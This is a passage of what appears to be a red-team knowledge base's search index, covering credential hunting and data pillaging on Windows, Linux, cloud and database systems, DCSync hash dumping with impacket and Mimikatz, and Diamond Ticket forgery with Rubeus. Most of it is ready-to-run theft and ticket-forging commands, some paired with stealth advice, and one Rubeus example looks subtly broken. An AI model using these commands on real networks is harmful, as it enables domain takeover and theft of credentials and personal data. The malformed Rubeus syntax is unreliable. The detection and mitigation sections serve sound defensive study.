$null}\n\n# Using NetExec\nnxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#application-configuration-files","title":"Application Configuration Files","text":"<ul> <li>IIS Web.config: <code>C:\\inetpub\\wwwroot\\web.config</code> and subdirectories</li> <li>Unattend.xml: Installation directories, <code>C:\\Windows\\Panther\\</code>, <code>C:\\Windows\\System32\\sysprep\\</code></li> <li>KeePass databases: Search for <code>.kdbx</code> files in user directories</li> <li>WinSCP configuration: <code>%APPDATA%\\WinSCP.ini</code> or registry</li> <li>RDP credentials: Saved RDP connections in <code>.rdp</code> files</li> <li>Software configuration files: <code>.ini</code>, <code>.xml</code>, <code>.config</code> in application directories</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#registry-locations","title":"Registry Locations","text":"<pre><code># Auto-logon credentials\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword\n\n# PuTTY saved sessions\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s\n\n# SNMP community strings\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities\"\n\n# VNC passwords\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query \"HKLM\\SOFTWARE\\RealVNC\\WinVNC4\" /v Password\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#powershell-history","title":"PowerShell History","text":"<pre><code># Read PowerShell history\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\n# Search for sensitive commands\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | findstr /i password\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | findstr /i secret\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#browser-data","title":"Browser Data","text":"<ul> <li>Firefox: <code>%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json</code></li> <li>Chrome: <code>%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data</code></li> <li>Edge: <code>%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data</code></li> <li>Saved form data: Look for autofill databases and cookies for active sessions</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#script-and-code-repositories","title":"Script and Code Repositories","text":"<ul> <li>Local Git repositories: Check <code>.git-credentials</code> files</li> <li>Visual Studio projects: Look for <code>app.config</code>, <code>web.config</code> with connection strings</li> <li>PowerShell scripts: Scan for <code>$password</code>, <code>$credential</code>, <code>ConvertTo-SecureString</code></li> <li>Batch files: Look for credentials passed as parameters</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#service-account-details","title":"Service Account Details","text":"<pre><code># List services with configuration details\nGet-WmiObject win32_service | Select-Object Name, StartName, PathName | Where-Object {$_.StartName -ne \"LocalSystem\"}\n\n# Check for non-standard service accounts\nwmic service get name,startname | findstr /v \"LocalSystem NetworkService LocalService\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code># List all scheduled tasks\nschtasks /query /fo LIST /v | findstr /i \"TASK_NAME USERNAME COMMAND\"\n\n# Examine XML files directly\ntype C:\\Windows\\System32\\Tasks\\*.job | findstr /i password\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#linux-credential-hunting","title":"Linux Credential Hunting","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#file-system-searches_1","title":"File System Searches","text":"<pre><code># Search for passwords in configuration files\ngrep -ir \"password\" /etc 2&gt;/dev/null\ngrep -ir \"passwd\" /home 2&gt;/dev/null\n\n# Search for database credentials\nfind / -type f -name \"*.conf\" -exec grep -l \"DB_USER\\|DB_PASS\\|database_password\" {} \\; 2&gt;/dev/null\nfind / -type f -name \"*.yaml\" -exec grep -l \"password\\|secret\\|key\" {} \\; 2&gt;/dev/null\n\n# Look for SSH keys\nfind / -type f -name \"id_rsa\" -o -name \"id_dsa\" 2&gt;/dev/null\nfind /home -type f -name \"authorized_keys\" -o -name \"known_hosts\" 2&gt;/dev/null\n\n# Search for private keys\nfind / -type f -name \"*.pem\" -o -name \"*.key\" -o -name \"*.pfx\" -o -name \"*.p12\" 2&gt;/dev/null\n\n# Look for environment files\ngrep -r \"export\" /etc/profile /etc/bashrc /etc/environment /home/*/.bashrc /home/*/.bash_profile 2&gt;/dev/null\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#git-repositories","title":"Git Repositories","text":"<pre><code># Look for git credentials\nfind /home -type f -name \".git-credentials\" -o -name \".gitconfig\" 2&gt;/dev/null\nfind / -type f -path \"*.git/config\" -exec grep -l \"url\" {} \\; 2&gt;/dev/null\n\n# Check git logs for secrets\nfind / -type d -name \".git\" -exec bash -c \"cd {}/../ &amp;&amp; git log -p | grep -i password\" \\; 2&gt;/dev/null\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#cloud-credentials","title":"Cloud Credentials","text":"<pre><code># AWS credentials\nfind /home -type f -path \"*/.aws/credentials\" 2&gt;/dev/null\nfind / -type f -path \"*aws*\" -exec grep -l \"aws_access_key_id\\|aws_secret_access_key\" {} \\; 2&gt;/dev/null\n\n# Azure credentials\nfind / -type f -name \"*.json\" -exec grep -l \"appId\\|password\\|tenant\" {} \\; 2&gt;/dev/null\n\n# Google Cloud\nfind / -type f -name \"application_default_credentials.json\" -o -name \"credentials.json\" 2&gt;/dev/null\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#web-application-files","title":"Web Application Files","text":"<pre><code># PHP files with database connections\ngrep -r \"mysqli_connect\\|mysql_connect\" /var/www/ 2&gt;/dev/null\n\n# Python Django settings\nfind / -name \"settings.py\" -exec grep -l \"PASSWORD\" {} \\; 2&gt;/dev/null\n\n# Rails database configuration\nfind / -name \"database.yml\" 2&gt;/dev/null\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#log-files","title":"Log Files","text":"<pre><code># Check authentication logs\ngrep -i \"successful\\|accepted\\|login\\|user\" /var/log/auth.log 2&gt;/dev/null\ngrep -i \"fail\\|invalid\\|error\" /var/log/auth.log 2&gt;/dev/null\n\n# Web server logs that might contain credentials in URLs\ngrep -r \"pass=\\|pwd=\\|password=\\|user=\\|username=\\|auth\" /var/log/ 2&gt;/dev/null\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#database-files","title":"Database Files","text":"<pre><code># SQLite databases\nfind / -name \"*.db\" -o -name \"*.sqlite\" -o -name \"*.sqlite3\" 2&gt;/dev/null\n\n# MySQL history files\nfind /home -name \".mysql_history\" 2&gt;/dev/null\n\n# PostgreSQL connection files\nfind /home -path \"*/.psql_history\" -o -path \"*/pgpass\" 2&gt;/dev/null\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#network-active-directory-pillaging","title":"Network &amp; Active Directory Pillaging","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#sysvol-enumeration","title":"SYSVOL Enumeration","text":"<pre><code># Map SYSVOL as a drive (if authenticated)\nnet use Z: \\\\domain.local\\SYSVOL\n\n# Search all policies\ndir /s /b Z:\\domain.local\\Policies\\*.xml\nfindstr /S /I /M \"cpassword\" Z:\\domain.local\\Policies\\*.xml\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#smb-share-enumeration","title":"SMB Share Enumeration","text":"<pre><code># Using PowerView\nImport-Module PowerView.ps1\nFind-DomainShare -CheckShareAccess | Select-Object Name, Path, Remark, ComputerName\n\n# Manual search for interesting files\ndir /s /b \"\\\\server\\share\\password*.*\"\ndir /s /b \"\\\\server\\share\\*.kdbx\"\ndir /s /b \"\\\\server\\share\\*.config\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#kerberos-tickets-and-service-accounts","title":"Kerberos Tickets and Service Accounts","text":"<pre><code># Using PowerView to find service accounts\nGet-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName\n\n# Look for Kerberos delegation\nGet-DomainComputer -TrustedToAuth | Select-Object -ExpandProperty dnshostname\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#interesting-shares-and-repositories","title":"Interesting Shares and Repositories","text":"<ul> <li>IT department shares: Often contain scripts with hardcoded credentials</li> <li>Developer shares: May have source code with API keys or connection strings</li> <li>Backup directories: Can contain database dumps or configuration backups</li> <li>Documentation shares: May include password spreadsheets or system documentation</li> <li>DFS shares: Distributed shares that might have different access controls</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#cloud-environment-pillaging","title":"Cloud Environment Pillaging","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#aws","title":"AWS","text":"<pre><code># List S3 buckets\naws s3 ls\n\n# Check for accessible secret material\naws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id &lt;SECRET_ID&gt;\n\n# Enumerate IAM information\naws iam generate-credential-report\naws iam get-credential-report\naws iam get-account-authorization-details\n\n# Check Lambda functions for hardcoded secrets\naws lambda list-functions\naws lambda get-function --function-name &lt;FUNCTION_NAME&gt;\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#azure","title":"Azure","text":"<pre><code># List storage accounts\naz storage account list\n\n# List Key Vault secrets (if access allows)\naz keyvault list\naz keyvault secret list --vault-name &lt;VAULT_NAME&gt;\n\n# Check App Service configuration\naz webapp config appsettings list --name &lt;APP_NAME&gt; --resource-group &lt;RESOURCE_GROUP&gt;\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#google-cloud","title":"Google Cloud","text":"<pre><code># List storage buckets\ngsutil ls\n\n# List Secret Manager secrets\ngcloud secrets list\ngcloud secrets versions access latest --secret=&lt;SECRET_NAME&gt;\n\n# Check service accounts\ngcloud iam service-accounts list\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#database-access","title":"Database Access","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#mysql","title":"MySQL","text":"<pre><code># If you have access to mysql client with existing credentials\nmysql -u root -p -e \"SELECT User, Host, Password FROM mysql.user\"\nmysql -u root -p -e \"SHOW DATABASES; USE wordpress; SELECT user_login, user_pass FROM wp_users\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#mssql","title":"MSSQL","text":"<pre><code># Using PowerUpSQL (if already have access)\nGet-SQLInstanceLocal | Get-SQLConnectionTest\nGet-SQLQuery -Instance \"Server\\Instance\" -Query \"SELECT name, password_hash FROM master.sys.sql_logins\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#postgresql","title":"PostgreSQL","text":"<pre><code># If you have psql access\npsql -U postgres -c \"SELECT usename, passwd FROM pg_shadow\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#sensitive-data-hunting","title":"Sensitive Data Hunting","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#personally-identifiable-information-pii","title":"Personally Identifiable Information (PII)","text":"<pre><code># Find Social Security Numbers\ngrep -r \"[0-9]\\{3\\}-[0-9]\\{2\\}-[0-9]\\{4\\}\" /path/to/search\n\n# Find email addresses\ngrep -r -E \"\\\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\\\b\" /path/to/search\n\n# Find credit card numbers\ngrep -r -E \"[0-9]{13,16}\" /path/to/search | grep -v -E \"[0-9]{17,}\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#business-critical-information","title":"Business-Critical Information","text":"<ul> <li>Financial reports: Look for quarterly/annual reports</li> <li>Strategic documents: Search for \"confidential\", \"internal only\", \"strategic plan\"</li> <li>Product development: Search for \"roadmap\", \"unreleased\", \"prototype\"</li> <li>Employee data: HR databases, salary information, performance reviews</li> <li>Customer data: CRM databases, contact lists, sales pipelines</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#health-information","title":"Health Information","text":"<ul> <li>Patient records: Look for PHI/HIPAA-protected information</li> <li>Medical history: Search for diagnostic codes, treatment plans</li> <li>Insurance information: Policy numbers, claims data</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#best-practices-for-data-pillaging","title":"Best Practices for Data Pillaging","text":"<ol> <li>Prioritize targets: Focus on high-value sources first (IT admin shares, configuration files)</li> <li>Document findings: Keep detailed records of what was accessed and where</li> <li>Minimize footprint: Avoid writing to disk when possible</li> <li>Respect scope: Stay within the boundaries of authorized testing</li> <li>Secure extracted data: Encrypt and protect any sensitive information collected</li> <li>Use stealthy techniques: Minimize noise and avoid triggering alerts</li> <li>Report findings responsibly: Document all discovered credentials for remediation</li> </ol>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#additional-tools-and-techniques","title":"Additional Tools and Techniques","text":"<ul> <li>CrackMapExec: For network share enumeration and pillaging</li> <li>EyeWitness: For visual reconnaissance of web interfaces that might expose credentials</li> <li>Empire/PowerShell: For executing pillaging modules in memory</li> <li>Metasploit: Offers various post-exploitation modules for credential harvesting</li> <li>BloodHound: For visualizing AD relationships that might reveal credential access paths</li> </ul>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/dcsync/","title":"Dcsync","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#technique","title":"Technique","text":"<p>DCSync is a credential theft technique that abuses the Windows Domain Controller replication process. It allows an attacker to impersonate a domain controller and request account password data from the targeted DC using the Directory Replication Service (DRS) Remote Protocol.</p> <p>The attack exploits the legitimate replication functionality that domain controllers use to synchronize Active Directory data across the domain. By simulating a DC requesting replication data, an attacker can extract sensitive information such as NTLM hashes, password history, and Kerberos keys for any domain user, including administrator accounts and service accounts.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#prerequisites","title":"Prerequisites","text":"<p>Access Level: The attacker needs to control an account with specific replication permissions: - DS-Replication-Get-Changes - DS-Replication-Get-Changes-All - DS-Replication-Get-Changes-In-Filtered-Set</p> <p>These permissions are typically granted to: - Domain Admins - Enterprise Admins - Domain Controllers - Administrators</p> <p>System State: A domain controller must be reachable from the attacker's position in the network.</p> <p>Information: Domain name and IP address of a domain controller.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful DCSync attacks allow an attacker to obtain the password hashes of all domain users, including the krbtgt account. With this information, an attacker can: - Conduct offline password cracking - Perform Pass-the-Hash attacks - Create Golden Tickets (if the krbtgt hash is obtained)</p> <p>OPSEC</p> <ul> <li>DCSync generates replication requests that can be logged in the directory service event logs (Event ID 4662).</li> <li>Modern detection systems specifically monitor for replication requests from non-domain controllers.</li> <li>The attack generates network traffic to domain controllers that can be detected with proper monitoring.</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#using-impacket-from-linux","title":"Using Impacket (from Linux)","text":"<pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'&lt;DC_IP&gt;'\n</code></pre> <p>To output to a file: <pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'&lt;DC_IP&gt;' -outputfile dcsync_hashes\n</code></pre></p> <p>To target a specific user: <pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'&lt;DC_IP&gt;' -just-dc-user administrator\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#using-mimikatz-from-windows","title":"Using Mimikatz (from Windows)","text":"<p>First, run a PowerShell session as the user with replication rights: <pre><code>runas /netonly /user:DOMAIN\\user powershell\n</code></pre></p> <p>Then execute Mimikatz: <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\\administrator\n</code></pre></p> <p>To extract all domain hashes: <pre><code>lsadump::dcsync /domain:DOMAIN.LOCAL /all\n</code></pre></p> <p>To specifically target the krbtgt account (for Golden Ticket attacks): <pre><code>lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>DCSync is generally a \"read-only\" attack that doesn't modify domain objects</li> <li>However, event logs will contain evidence of the attack</li> <li>The activity will leave a trace in network traffic logs</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#detection","title":"Detection","text":"<ul> <li>Monitor for Event ID 4662 showing replication requests from computers that are not domain controllers</li> <li>Look for network traffic patterns consistent with Active Directory replication from unauthorized sources</li> <li>Implement honey accounts and monitor for replication requests targeting these accounts</li> <li>Use tools like Microsoft ATA or Defender for Identity to detect suspicious replication activity</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/dcsync/#mitigation","title":"Mitigation","text":"<ul> <li>Strictly limit which accounts have replication permissions in the domain</li> <li>Regularly audit and review accounts with replication rights</li> <li>Implement the principle of least privilege for all administrative accounts</li> <li>Use dedicated admin accounts with Protected Users group membership when possible</li> <li>Monitor and alert on changes to Directory Service replication permissions</li> <li>Consider implementing a tiered administrative model to isolate domain admin credentials</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1003.006","#stage/privilege-escalation","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/ldap"]},{"location":"Active%20Directory/flat/diamond_ticket/","title":"Diamond ticket","text":"","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#technique","title":"Technique","text":"<p>A Diamond Ticket is an evolution of the Golden Ticket technique that offers improved operational security. Instead of creating a completely forged ticket as in a Golden Ticket attack, a Diamond Ticket starts with a legitimate Kerberos ticket issued by a Domain Controller and then selectively modifies specific fields.</p> <p>This approach maintains most of the legitimate ticket's properties while altering critical elements like the user identity or group memberships. Since the ticket was initially created by the Domain Controller itself, it will contain all the correct details from the domain's Kerberos policy, making it harder to detect compared to completely forged tickets.</p>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - Access to the KRBTGT account's password hash (typically requires Domain Admin privileges or similar access to obtain) - The ability to request legitimate tickets in the domain</p> <p>Information Needed: - Domain name - KRBTGT NTLM hash or AES keys - Domain SID - User to impersonate</p> <p>Tools: Specialized tools that support Diamond Ticket creation, such as Rubeus</p>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Diamond Tickets provide domain-wide persistence and lateral movement capabilities with enhanced stealth, allowing an attacker to: - Access any resource in the domain as any user - Modify group memberships to elevate privileges - Operate with reduced risk of detection compared to Golden Tickets</p> <p>OPSEC Advantages</p> <ul> <li>Unlike Golden Tickets, Diamond Tickets have an AS-REQ (Authentication Service Request) preceding the TGS-REQ (Ticket-Granting Service Request), making them appear more legitimate</li> <li>Legitimate ticket values are preserved where possible</li> <li>The ticket contains correct timestamps, encryption types, and other domain Kerberos policy settings</li> <li>Less likely to trigger alerts based on ticket anomalies</li> </ul>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#using-rubeus-for-diamond-tickets","title":"Using Rubeus for Diamond Tickets","text":"<ol> <li>Request a legitimate TGT for a user:</li> </ol> <pre><code>Rubeus.exe asktgt /user:regularuser /password:Password123 /domain:contoso.local /nowrap\n</code></pre> <ol> <li>Use the obtained TGT and modify it with the Diamond Ticket technique:</li> </ol> <pre><code>Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:HASHOFKRBTGTACCOUNT /domain:contoso.local /dc:dc01.contoso.local /ptt\n</code></pre> <p>The parameters used: - <code>/tgtdeleg</code>: Obtains a legitimate TGT through Kerberos delegation - <code>/ticketuser</code>: The user to impersonate - <code>/ticketuserid</code>: The RID of the user to impersonate - <code>/groups</code>: The group IDs to add to the ticket (including Domain Admins - 512) - <code>/krbkey</code>: The KRBTGT account hash - <code>/domain</code>: The domain name - <code>/dc</code>: The domain controller to request the ticket from - <code>/ptt</code>: Pass the ticket into the current session</p>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#alternative-using-rubeus-ask-ptt","title":"Alternative Using Rubeus ASK + PTT","text":"<p>Another approach is to request a legitimate ticket and then manipulate it before injecting:</p> <pre><code># First, request a TGT but save it to a variable instead of injecting it\n$ticket = Rubeus.exe ask /user:regularuser /password:Password123 /domain:contoso.local /nowrap\n\n# Then modify the ticket and inject it\nRubeus.exe ptt /ticket:$ticket /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:HASHOFKRBTGTACCOUNT\n</code></pre>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#detection-mitigation","title":"Detection &amp; 